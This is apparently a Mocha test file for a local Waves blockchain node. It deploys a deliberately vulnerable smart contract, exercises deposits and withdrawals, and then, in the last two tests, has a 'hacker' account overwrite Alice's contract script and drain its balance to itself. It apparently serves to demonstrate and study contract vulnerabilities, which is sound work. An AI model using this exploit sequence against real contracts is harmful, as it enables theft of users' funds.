// TODO: Find out how fees are constructed
/* global setupAccounts, accounts, compile, file, setScript, broadcast, waitForTx, invokeScript, address, publicKey, transfer */
const assert = require("assert")
const { nodeInteraction } = require("@waves/waves-transactions")

const toWavelets = (waves = 0) => waves * 10 ** 8
const toWaves = (wavelets = 0) => wavelets / 10 ** 8
const nodeUrl = "http://localhost:6869/"

const accountsConfig = {
	alice: toWavelets(10),
	bob: toWavelets(10),
	hacker: toWavelets(10),
}

describe("Vulnerable smart contract", function() {
	before(async function() {
		this.timeout(100000)
		await setupAccounts(accountsConfig)

		const script = compile(file("hackMe.ride"))

		const setScriptTx = setScript({ script }, accounts.alice)
		await broadcast(setScriptTx)
		await waitForTx(setScriptTx.id)

		console.info(`Hackable script has been deployed (${setScriptTx.id})\n`)
	})

	it("Accepts deposits and updates data storage", async function() {
		const depositAmountWaves = 2

		const depositTx = invokeScript(
			{
				dApp: address(accounts.alice),
				call: { function: "deposit" },
				payment: [{ assetId: null, amount: toWavelets(depositAmountWaves) }],
			},
			accounts.bob,
		)
		await broadcast(depositTx)
		await waitForTx(depositTx.id)

		console.info(
			`Bob successfully deposited ${depositAmountWaves} $WAVES to the contract (${depositTx.id})`,
		)
	})

	it("Allows withdrawals and updates data storage", async function() {
		const withdrawalAmountWaves = 1

		const withdrawalTx = invokeScript(
			{
				dApp: address(accounts.alice),
				call: {
					function: "withdraw",
					args: [{ type: "integer", value: toWavelets(withdrawalAmountWaves) }],
				},
			},
			accounts.bob,
		)
		await broadcast(withdrawalTx)
		await waitForTx(withdrawalTx.id)

		console.info(
			`Bob has successfully withdrawn ${withdrawalAmountWaves} $WAVES from the contract (${withdrawalTx.id})`,
		)
	})

	it("Denies withdrawals when amount is too high", async function() {
		const withdrawalAmountWaves = 5

		try {
			const withdrawalTx = invokeScript(
				{
					dApp: address(accounts.alice),
					call: {
						function: "withdraw",
						args: [{ type: "integer", value: toWavelets(withdrawalAmountWaves) }],
					},
				},
				accounts.bob,
			)

			await broadcast(withdrawalTx)
			await waitForTx(withdrawalTx.id)
		} catch (err) {
			const regex = /Error while executing account-script: Balance of \w+ is to low \(1 \$WAVES\)/
			const isExpectedErrorMessage = regex.test(err.message)
			assert.equal(isExpectedErrorMessage, true)

			console.info(
				`Bobs withdrawal of ${withdrawalAmountWaves} $WAVES from the contract was denied`,
			)
		}
	})

	it("Overwrites the smart contract with a hacked version", async function() {
		const aliceSenderPublicKey = publicKey(accounts.alice)
		const script = compile(file("blackHat.ride"))
		const setScriptFeeWaves = 0.014

		const setScriptTx = setScript(
			{ script, senderPublicKey: aliceSenderPublicKey, fee: toWavelets(setScriptFeeWaves) },
			accounts.hacker,
		)
		await broadcast(setScriptTx)
		await waitForTx(setScriptTx.id)

		console.info(`Hacked smart contract has been deployed (${setScriptTx.id})`)
	})

	it("Hacker steals funds from Alice's contract", async function() {
		const aliceSenderPublicKey = publicKey(accounts.alice)
		const aliceAddress = address(accounts.alice)
		const hackerAddress = address(accounts.hacker)
		const transferFeeWaves = 0.005

		const aliceContractBalanceWavelets = await nodeInteraction.balance(aliceAddress, nodeUrl)
		const availableFundsToStealWavelets =
			aliceContractBalanceWavelets - toWavelets(transferFeeWaves)

		const transferTx = transfer(
			{
				amount: availableFundsToStealWavelets,
				recipient: hackerAddress,
				senderPublicKey: aliceSenderPublicKey,
				fee: toWavelets(transferFeeWaves),
			},
			accounts.hacker,
		)
		await broadcast(transferTx)
		await waitForTx(transferTx.id)

		console.info(
			`Hacker has successfully stolen ${toWaves(
				availableFundsToStealWavelets,
			)} $WAVES from the contract (${transferTx.id})`,
		)
	})
})
